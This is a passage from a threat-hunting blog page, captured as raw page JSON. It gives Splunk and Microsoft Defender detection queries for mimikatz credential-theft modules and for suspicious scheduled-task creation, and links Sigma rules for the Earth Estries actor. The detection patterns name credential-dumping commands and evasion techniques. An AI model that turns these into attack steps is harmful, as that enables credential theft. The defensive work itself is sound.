CommandLine=”*mimikatz*”) OR (CommandLine=”*::aadcookie*” OR CommandLine=”*::detours*” OR CommandLine=”*::memssp*” OR CommandLine=”*::mflt*” OR CommandLine=”*::ncroutemon*” OR CommandLine=”*::ngcsign*” OR CommandLine=”*::printnightmare*” OR CommandLine=”*::skeleton*” OR CommandLine=”*::preshutdown*” OR CommandLine=”*::mstsc*” OR CommandLine=”*::multirdp*”) OR (CommandLine=”*rpc::*” OR CommandLine=”*token::*” OR CommandLine=”*crypto::*” OR CommandLine=”*dpapi::*” OR CommandLine=”*sekurlsa::*” OR CommandLine=”*kerberos::*” OR CommandLine=”*lsadump::*” OR CommandLine=”*privilege::*” OR CommandLine=”*process::*” OR CommandLine=”*vault::*”))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"ruby"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_365":{"__typename":"Paragraph","id":"dcff7a17d5b3_365","name":"d376","type":"P","href":null,"layout":null,"metadata":null,"text":"MDE","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_366":{"__typename":"Paragraph","id":"dcff7a17d5b3_366","name":"c6f5","type":"PRE","href":null,"layout":null,"metadata":null,"text":"DeviceProcessEvents | where ((ProcessCommandLine contains @’DumpCreds’ or ProcessCommandLine contains @’mimikatz’) or (ProcessCommandLine contains @’::aadcookie’ or ProcessCommandLine contains @’::detours’ or ProcessCommandLine contains @’::memssp’ or ProcessCommandLine contains @’::mflt’ or ProcessCommandLine contains @’::ncroutemon’ or ProcessCommandLine contains @’::ngcsign’ or ProcessCommandLine contains @’::printnightmare’ or ProcessCommandLine contains @’::skeleton’ or ProcessCommandLine contains @’::preshutdown’ or ProcessCommandLine contains @’::mstsc’ or ProcessCommandLine contains @’::multirdp’) or (ProcessCommandLine contains @’rpc::’ or ProcessCommandLine contains @’token::’ or ProcessCommandLine contains @’crypto::’ or ProcessCommandLine contains @’dpapi::’ or ProcessCommandLine contains @’sekurlsa::’ or ProcessCommandLine contains @’kerberos::’ or ProcessCommandLine contains @’lsadump::’ or ProcessCommandLine contains @’privilege::’ or ProcessCommandLine contains @’process::’ or ProcessCommandLine contains @’vault::’))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"php"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_367":{"__typename":"Paragraph","id":"dcff7a17d5b3_367","name":"86b9","type":"H4","href":null,"layout":null,"metadata":null,"text":"Schtask","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_368":{"__typename":"Paragraph","id":"dcff7a17d5b3_368","name":"03ba","type":"BQ","href":null,"layout":null,"metadata":null,"text":"Chinese state-sponsored cyber actors have been observed using Cobalt Strike, webshells, or command line interface tools, such as schtask or crontab to create and schedule tasks that enumerate victim devices and networks. Note: this technique also applies to Persistence [TA0003] and Privilege Escalation [TA0004]. Monitor scheduled task creation from common utilities using command-line invocation and compare for any changes that do not correlate with known software, patch cycles, or other administrative activity. Configure event logging for scheduled task creation and monitor process execution from svchost.exe (Windows 10) and Windows Task Scheduler (Older version of Windows) to look for changes in %systemroot%\\System32\\Tasks that do not correlate with known software, patch cycles, or other administrative activity. Additionally monitor for any scheduled tasks created via command line utilities — such as PowerShell or Windows Management Instrumentation (WMI) — that do not conform to typical administrator or user actions.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":604,"end":656,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":706,"end":733,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":854,"end":877,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":915,"end":925,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":929,"end":969,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":878,"end":904,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_369":{"__typename":"Paragraph","id":"dcff7a17d5b3_369","name":"76c7","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"sigma\u002Frules\u002Fwindows\u002Fprocess_creation\u002Fproc_creation_win_schtasks_creation.yml at master ·…\nMain Sigma Rule Repository. Contribute to SigmaHQ\u002Fsigma development by creating an account on GitHub.github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":201,"href":"https:\u002F\u002Fgithub.com\u002FSigmaHQ\u002Fsigma\u002Fblob\u002Fmaster\u002Frules\u002Fwindows\u002Fprocess_creation\u002Fproc_creation_win_schtasks_creation.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":89,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":90,"end":191,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSigmaHQ\u002Fsigma\u002Fblob\u002Fmaster\u002Frules\u002Fwindows\u002Fprocess_creation\u002Fproc_creation_win_schtasks_creation.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*LnWEDwqKNGjc1vm8"}},"Paragraph:dcff7a17d5b3_370":{"__typename":"Paragraph","id":"dcff7a17d5b3_370","name":"0fe3","type":"P","href":null,"layout":null,"metadata":null,"text":"MDE:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_371":{"__typename":"Paragraph","id":"dcff7a17d5b3_371","name":"58f7","type":"PRE","href":null,"layout":null,"metadata":null,"text":"DeviceProcessEvents | where ((FolderPath endswith @’\\schtasks.exe’ and ProcessCommandLine contains @’ \u002Fcreate ‘) and not (((InitiatingProcessAccountName contains @’AUTHORI’ or InitiatingProcessAccountName contains @’AUTORI’) or (InitiatingProcessAccountDomain contains @’AUTHORI’ or InitiatingProcessAccountDomain contains @’AUTORI’))))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_372":{"__typename":"Paragraph","id":"dcff7a17d5b3_372","name":"db83","type":"P","href":null,"layout":null,"metadata":null,"text":"Splunk:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_373":{"__typename":"Paragraph","id":"dcff7a17d5b3_373","name":"3877","type":"PRE","href":null,"layout":null,"metadata":null,"text":"index=* source=”WinEventLog:*” AND ((Image=”*\\\\schtasks.exe” AND CommandLine=”* \u002Fcreate *”) AND NOT (User=”*AUTHORI*” OR User=”*AUTORI*”)) | table CommandLine,ParentCommandLine","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"markdown"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_374":{"__typename":"Paragraph","id":"dcff7a17d5b3_374","name":"b2fe","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"sigma\u002Frules\u002Fwindows\u002Fbuiltin\u002Ftaskscheduler\u002Fwin_taskscheduler_lolbin_execution_via_task_scheduler.yml…\nMain Sigma Rule Repository. Contribute to SigmaHQ\u002Fsigma development by creating an account on GitHub.github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":212,"href":"https:\u002F\u002Fgithub.com\u002FSigmaHQ\u002Fsigma\u002Fblob\u002Fmaster\u002Frules\u002Fwindows\u002Fbuiltin\u002Ftaskscheduler\u002Fwin_taskscheduler_lolbin_execution_via_task_scheduler.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":100,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":101,"end":202,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSigmaHQ\u002Fsigma\u002Fblob\u002Fmaster\u002Frules\u002Fwindows\u002Fbuiltin\u002Ftaskscheduler\u002Fwin_taskscheduler_lolbin_execution_via_task_scheduler.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*WO9eiXLv-n8wbt-E"}},"Paragraph:dcff7a17d5b3_375":{"__typename":"Paragraph","id":"dcff7a17d5b3_375","name":"08eb","type":"P","href":null,"layout":null,"metadata":null,"text":"Splunk","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_376":{"__typename":"Paragraph","id":"dcff7a17d5b3_376","name":"c175","type":"PRE","href":null,"layout":null,"metadata":null,"text":"index=* source=”WinEventLog:Microsoft-Windows-TaskScheduler\u002FOperational” AND (EventCode=”129\" AND (Path=”*\\\\calc.exe” OR Path=”*\\\\cscript.exe” OR Path=”*\\\\mshta.exe” OR Path=”*\\\\mspaint.exe” OR Path=”*\\\\notepad.exe” OR Path=”*\\\\regsvr32.exe” OR Path=”*\\\\wscript.exe”))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"swift"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_377":{"__typename":"Paragraph","id":"dcff7a17d5b3_377","name":"75aa","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"sigma\u002Frules\u002Fwindows\u002Fprocess_creation\u002Fproc_creation_win_schtasks_reg_loader_encoded.yml at master ·…\nMain Sigma Rule Repository. Contribute to SigmaHQ\u002Fsigma development by creating an account on GitHub.github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":211,"href":"https:\u002F\u002Fgithub.com\u002FSigmaHQ\u002Fsigma\u002Fblob\u002Fmaster\u002Frules\u002Fwindows\u002Fprocess_creation\u002Fproc_creation_win_schtasks_reg_loader_encoded.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":99,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":100,"end":201,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSigmaHQ\u002Fsigma\u002Fblob\u002Fmaster\u002Frules\u002Fwindows\u002Fprocess_creation\u002Fproc_creation_win_schtasks_reg_loader_encoded.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*vL998rpBiPC9TJUg"}},"Paragraph:dcff7a17d5b3_378":{"__typename":"Paragraph","id":"dcff7a17d5b3_378","name":"7764","type":"P","href":null,"layout":null,"metadata":null,"text":"Splunk","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_379":{"__typename":"Paragraph","id":"dcff7a17d5b3_379","name":"5d5d","type":"PRE","href":null,"layout":null,"metadata":null,"text":"index=* source=”WinEventLog:*” AND ((Image=”*\\\\schtasks.exe” OR OriginalFileName=”schtasks.exe”) AND CommandLine=”*\u002FCreate*” AND (CommandLine=”*FromBase64String*” OR CommandLine=”*encodedcommand*”) AND (CommandLine=”*Get-ItemProperty*” OR CommandLine=”* gp *”) AND (CommandLine=”*HKCU:*” OR CommandLine=”*HKLM:*” OR CommandLine=”*registry::*” OR CommandLine=”*HKEY_*”))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"markdown"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_380":{"__typename":"Paragraph","id":"dcff7a17d5b3_380","name":"0365","type":"P","href":null,"layout":null,"metadata":null,"text":"MDE","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_381":{"__typename":"Paragraph","id":"dcff7a17d5b3_381","name":"93c3","type":"PRE","href":null,"layout":null,"metadata":null,"text":"DeviceProcessEvents | where ((FolderPath endswith @’\\schtasks.exe’ or InitiatingProcessVersionInfoOriginalFileName =~ @’schtasks.exe’ or ProcessVersionInfoOriginalFileName =~ @’schtasks.exe’) and ProcessCommandLine contains @’\u002FCreate’ and (ProcessCommandLine contains @’FromBase64String’ or ProcessCommandLine contains @’encodedcommand’) and (ProcessCommandLine contains @’Get-ItemProperty’ or ProcessCommandLine contains @’ gp ‘) and (ProcessCommandLine contains @’HKCU:’ or ProcessCommandLine contains @’HKLM:’ or ProcessCommandLine contains @’registry::’ or ProcessCommandLine contains @’HKEY_’))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_382":{"__typename":"Paragraph","id":"dcff7a17d5b3_382","name":"1cbe","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"sigma\u002Frules\u002Fwindows\u002Fprocess_creation\u002Fproc_creation_win_schtasks_folder_combos.yml at master ·…\nMain Sigma Rule Repository. Contribute to SigmaHQ\u002Fsigma development by creating an account on GitHub.github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":206,"href":"https:\u002F\u002Fgithub.com\u002FSigmaHQ\u002Fsigma\u002Fblob\u002Fmaster\u002Frules\u002Fwindows\u002Fprocess_creation\u002Fproc_creation_win_schtasks_folder_combos.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":94,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":95,"end":196,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSigmaHQ\u002Fsigma\u002Fblob\u002Fmaster\u002Frules\u002Fwindows\u002Fprocess_creation\u002Fproc_creation_win_schtasks_folder_combos.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*zYEeXCtxPBIs00If"}},"Paragraph:dcff7a17d5b3_383":{"__typename":"Paragraph","id":"dcff7a17d5b3_383","name":"ab4c","type":"P","href":null,"layout":null,"metadata":null,"text":"MDE:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_384":{"__typename":"Paragraph","id":"dcff7a17d5b3_384","name":"baa0","type":"PRE","href":null,"layout":null,"metadata":null,"text":"DeviceProcessEvents | where ((FolderPath endswith @’\\schtasks.exe’ or InitiatingProcessVersionInfoOriginalFileName =~ @’schtasks.exe’ or ProcessVersionInfoOriginalFileName =~ @’schtasks.exe’) and ProcessCommandLine contains @’ \u002Fcreate ‘ and (ProcessCommandLine contains @’powershell’ or ProcessCommandLine contains @’pwsh’ or ProcessCommandLine contains @’cmd \u002Fc ‘ or ProcessCommandLine contains @’cmd \u002Fk ‘ or ProcessCommandLine contains @’cmd \u002Fr ‘ or ProcessCommandLine contains @’cmd.exe \u002Fc ‘ or ProcessCommandLine contains @’cmd.exe \u002Fk ‘ or ProcessCommandLine contains @’cmd.exe \u002Fr ‘) and (ProcessCommandLine contains @’C:\\ProgramData\\’ or ProcessCommandLine contains @’%ProgramData%’))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_385":{"__typename":"Paragraph","id":"dcff7a17d5b3_385","name":"faf9","type":"P","href":null,"layout":null,"metadata":null,"text":"Splunk","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_386":{"__typename":"Paragraph","id":"dcff7a17d5b3_386","name":"6402","type":"PRE","href":null,"layout":null,"metadata":null,"text":"index=* source=”WinEventLog:*” AND ((Image=”*\\\\schtasks.exe” OR OriginalFileName=”schtasks.exe”) AND CommandLine=”* \u002Fcreate *” AND (CommandLine=”*powershell*” OR CommandLine=”*pwsh*” OR CommandLine=”*cmd \u002Fc *” OR CommandLine=”*cmd \u002Fk *” OR CommandLine=”*cmd \u002Fr *” OR CommandLine=”*cmd.exe \u002Fc *” OR CommandLine=”*cmd.exe \u002Fk *” OR CommandLine=”*cmd.exe \u002Fr *”) AND (CommandLine=”*C:\\\\ProgramData\\\\*” OR CommandLine=”*%Progr","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"markdown"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_387":{"__typename":"Paragraph","id":"dcff7a17d5b3_387","name":"3741","type":"H4","href":null,"layout":null,"metadata":null,"text":"D3fend CAD","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_388":{"__typename":"Paragraph","id":"dcff7a17d5b3_388","name":"f61d","type":"P","href":null,"layout":null,"metadata":null,"text":"You want to understand and visualize which artifacts, processes, EventIDs and API’s are relevant for detecting or preventing attacks like AD and ntds.dit and which countermeasure you could take?","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_389":{"__typename":"Paragraph","id":"dcff7a17d5b3_389","name":"c6e6","type":"P","href":null,"layout":null,"metadata":null,"text":"Try CAD, it is a versatile tool designed to support many modeling and graphing use cases. A CAD graph serves as a realization of the D3FEND ontology, representing specific instances of the ontology’s classes and relationships.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*ZK1JsZwQFLuKJif9jE-KeA.png":{"__typename":"ImageMetadata","id":"1*ZK1JsZwQFLuKJif9jE-KeA.png","originalHeight":728,"originalWidth":1374,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:dcff7a17d5b3_390":{"__typename":"Paragraph","id":"dcff7a17d5b3_390","name":"0f70","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*ZK1JsZwQFLuKJif9jE-KeA.png"},"text":"Relationships NTDS.dit","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_391":{"__typename":"Paragraph","id":"dcff7a17d5b3_391","name":"3625","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"D3FEND CAD Tool\nCyber Attack-Defense Utility for Capturing Engagements and Understandable Scenariosd3fend.mitre.org","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":115,"href":"https:\u002F\u002Fd3fend.mitre.org\u002Fcad\u002F","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":15,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":16,"end":99,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fd3fend.mitre.org\u002Fcad\u002F","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":""}},"Paragraph:dcff7a17d5b3_392":{"__typename":"Paragraph","id":"dcff7a17d5b3_392","name":"e972","type":"P","href":null,"layout":null,"metadata":null,"text":"Documentation","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_393":{"__typename":"Paragraph","id":"dcff7a17d5b3_393","name":"9930","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"D3FEND CAD User Guide\nPut the D3FEND ontology into action with the D3FEND CAD Tool! CAD is a versatile tool designed to support many modeling…d3fend.mitre.org","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":158,"href":"https:\u002F\u002Fd3fend.mitre.org\u002Fcad\u002Fdocs\u002F","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":21,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":22,"end":142,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fd3fend.mitre.org\u002Fcad\u002Fdocs\u002F","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*T9fypKkhm6iJ11MQ"}},"Paragraph:dcff7a17d5b3_394":{"__typename":"Paragraph","id":"dcff7a17d5b3_394","name":"ea5c","type":"P","href":null,"layout":null,"metadata":null,"text":"Examples can be load directly from CAD","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*upmtfO5XLTj3142EtqpgAA.png":{"__typename":"ImageMetadata","id":"1*upmtfO5XLTj3142EtqpgAA.png","originalHeight":434,"originalWidth":1390,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:dcff7a17d5b3_395":{"__typename":"Paragraph","id":"dcff7a17d5b3_395","name":"1e12","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*upmtfO5XLTj3142EtqpgAA.png"},"text":"disk-formatting-contribution.json for e.g. by SIMKRA","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_396":{"__typename":"Paragraph","id":"dcff7a17d5b3_396","name":"8747","type":"H3","href":null,"layout":null,"metadata":null,"text":"Hunting Chinese Threat Actor Earth Estries","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_397":{"__typename":"Paragraph","id":"dcff7a17d5b3_397","name":"19a7","type":"P","href":null,"layout":null,"metadata":null,"text":"Remote Service Creation Vmware","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_398":{"__typename":"Paragraph","id":"dcff7a17d5b3_398","name":"6239","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"Sigma-Rules\u002FEarth Estries ChinaChoper remote service creation Vmware.yml at main ·…\nSigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242\u002FSigma-Rules development by creating an…github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":208,"href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FEarth%20Estries%20ChinaChoper%20remote%20service%20creation%20Vmware.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":83,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":84,"end":198,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FEarth%20Estries%20ChinaChoper%20remote%20service%20creation%20Vmware.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*kh2TWb92QH0oCnBb"}},"Paragraph:dcff7a17d5b3_399":{"__typename":"Paragraph","id":"dcff7a17d5b3_399","name":"e05e","type":"P","href":null,"layout":null,"metadata":null,"text":"Rundll32 to deploy Cobalt Strike","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_400":{"__typename":"Paragraph","id":"dcff7a17d5b3_400","name":"a471","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"Sigma-Rules\u002FEarth Estries Rundll32.exe loaders to deploy Cobalt Strike.yml at main ·…\nSigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242\u002FSigma-Rules development by creating an…github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":210,"href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FEarth%20Estries%20Rundll32.exe%20loaders%20to%20deploy%20Cobalt%20Strike.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":85,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":86,"end":200,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FEarth%20Estries%20Rundll32.exe%20loaders%20to%20deploy%20Cobalt%20Strike.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*ldcpU-tEfSZ5CNJb"}},"Paragraph:dcff7a17d5b3_401":{"__typename":"Paragraph","id":"dcff7a17d5b3_401","name":"fa96","type":"P","href":null,"layout":null,"metadata":null,"text":"QConvergeConsole Vulnerability Apache Tomcat6","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_402":{"__typename":"Paragraph","id":"dcff7a17d5b3_402","name":"6211","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"Sigma-Rules\u002FEarth Estries exploiting QConvergeConsole vulnerability in Apache Tomcat6.yml at main ·…\nSigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242\u002FSigma-Rules development by creating an…github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":225,"href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FEarth%20Estries%20exploiting%20QConvergeConsole%20vulnerability%20in%20Apache%20Tomcat6.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":100,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":101,"end":215,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FEarth%20Estries%20exploiting%20QConvergeConsole%20vulnerability%20in%20Apache%20Tomcat6.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*0yWWF7jMxdSQYMgl"}},"Paragraph:dcff7a17d5b3_403":{"__typename":"Paragraph","id":"dcff7a17d5b3_403","name":"7d52","type":"P","href":null,"layout":null,"metadata":null,"text":"QConvergeCconsole Vulnerability 2","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_404":{"__typename":"Paragraph","id":"dcff7a17d5b3_404","name":"fd67","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"Sigma-Rules\u002FEarth Estries exploiting QConvergeConsole vulnerability.yml at main ·…\nSigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242\u002FSigma-Rules development by creating 